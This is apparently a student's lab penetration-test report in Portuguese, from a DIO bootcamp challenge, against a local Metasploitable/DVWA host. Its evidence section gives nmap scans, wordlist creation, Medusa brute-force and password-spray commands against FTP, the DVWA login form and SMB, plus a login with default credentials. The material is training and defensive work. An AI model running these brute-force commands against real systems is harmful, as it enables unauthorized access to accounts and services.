# Entrega-do-Desafio
Entrega do Desafio DIO
Sumário
1.	Informações Gerais:
2.	Resumo Executivo
3.	Resultados da Varredura de Vulnerabilidades
4.	Conclusão
5.	Evidências
6.	Imagens estará no diretório de  imagens desse projeto




















1 - Informações Gerais:
Objetivo: Avaliar a segurança do serviço web da Empresa e identificar vulnerabilidades exploráveis.
A varredura de vulnerabilidades foi realizada como parte do Teste de Penetração (Pentest) na infraestrutura/sistema da Empresa. O objetivo é identificar falhas de segurança que possam ser exploradas por atacantes e propor ações corretivas para mitigação dos riscos.

Escopo:
•	Sistemas testados: Aplicação Web da empresa http://192.168.56.101
•	Metodologia: Caixa Preta
•	Restrições: Apenas testes não destrutivos foram realizados, com intuito de identificação de vulnerabilidades na aplicação web e informação ao cliente contratante.
Site alvo: http://192.168.56.101
IP: 192.168.56.101
A varredura foi conduzida utilizando ferramentas especializadas para identificar vulnerabilidades conhecidas e possíveis pontos fracos na infraestrutura. Foram realizadas as seguintes etapas:
•	Mapeamento de Ativos: Identificação de servidores, aplicações.
•	Escaneamento Automatizado: Uso de ferramentas de varredura para detectar vulnerabilidades.
•	Análise Manual: Revisão dos resultados para evitar falsos positivos.
•	Classificação de Riscos: Avaliação do impacto e da criticidade das vulnerabilidades.
Ferramentas Utilizadas
As seguintes ferramentas foram empregadas para a varredura:
•	Nmap – Identificação de portas e serviços abertos.
•	Medusa – Para ataque de força bruta.
 Principais Vulnerabilidades Identificadas
A análise identificou as seguintes vulnerabilidades:
Ferramenta utilizada: NMAP, MEDUSA.

2 - Resumo Executivo:
Foi feito o levantamento na aplicação Empresa, foram encontrados diretórios que possivelmente poderia ser atacado com força bruta.
Com uma análise mais profunda foram encontrados diretórios de aplicações web, no IP 192.168.56.101. 
Foi utilizada a ferramenta , conforme imagens a vulnerabilidade foi constatada, como usuários listados na pesquisa.
Listagem de diretórios da aplicação.
Principais Vulnerabilidades Identificadas
A análise identificou as seguintes vulnerabilidades: 
Servidor desprotegidos, como FTP, HTTP e SMB.

4.	Recomendações e Mitigações
Para mitigar os riscos identificados, recomenda-se:
•	Fechar portas e serviços não utilizados para reduzir a superfície de ataque.
•	Corrigir falhas de configuração aplicando práticas de segurança recomendadas.
•	Implementar autenticação forte e MFA para sistemas críticos.
•	Realizar monitoramento contínuo e novas varreduras periódicas.
•	Atualizar o sistema operacional para evitar futuras vulnerabilidades


5.	Conclusão 
A varredura revelou vulnerabilidades críticas que exigem correção imediata para evitar possíveis ataques. A implementação das medidas recomendadas fortalecerá a segurança da infra estrutura e protegerá os ativos digitais da organização.
 Gostaria de agradecer pela confiança em meu trabalho e dedicação, espero ter        ajudado na segurança da sua empresa.     
Caso precise de um relatório técnico detalhado ou um plano de ação para mitigação,      estou à disposição!


6.	Evidências

Servidor aceitando ping externo, o ideal seria está bloqueado.
Conforme consta na imagem img Ping Externo
Comando ping 192.168.56.101

Nmap fazendo varredura em portas expostas para internet:
Com essas informações o hacker poderia tentar um ataque em portas que não deveria está  expostas por exemplo portas 21, 22, 80, 445, 139, 138 com suas versões, facilitando o tipo de vulnerabilidade para explorar.
Além das portas expostas o nmap nos traz diretórios que podem ser explorados com ferramentas específicas expondo a empresa em uma altíssima vulnerabilidade.
Img  nmap varredura de portas

Protocolo FTP porta 21 aberta
Comando ftp 192.168.56.101


Img  FTP

Criando a worlists para fazer o acesso ao servidor FTP
Comando:
wordlists
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

echo -e "123456\npassword\nqwerty\nmsfadmin\nroot\nmsfadmin" > pass.txt
img worlists
Conseguindo a senha do servidor de FTP

img senha do servidor FTP

Comando medusa -h 192.168.56.101 -U users.txt -P password.txt -M ftp -t 6
Acesso bem sucedido ao servidor FTP com as credenciais obtidas pela ferramenta Medusa.
img accesso bem sucedido

Foi feita uma varredura na apilcação DVWA para descobrir a senha de administração do site.
Foi localizada a senha com sucesso como na imagem.
img varredura senha dvwa

Foi localizada a aplicação de administração web no endereço http://192.168.56.101/dvwa
Comando:  medusa -h 192.168.56.101 -U users.txt -P password.txt -M http \ -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' \ -m 'FAIL=Login failed' -t 6
img senha dvwa

Img dvwa 



Enumerando o SMB do servidor 
Comando enum4linux -a 192.168.56.101 | tee enum4_saida.txt
Wordlist: 
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

img enumeração smb

Obtendo acesso ao servidor SMB com a varredura de compartilhamentos.
smbclient -L //192.168.56.101 -U msfadmin
Login: msfadmin
Senha: msfadmin
img smb logado

img logado com ponto de montagem


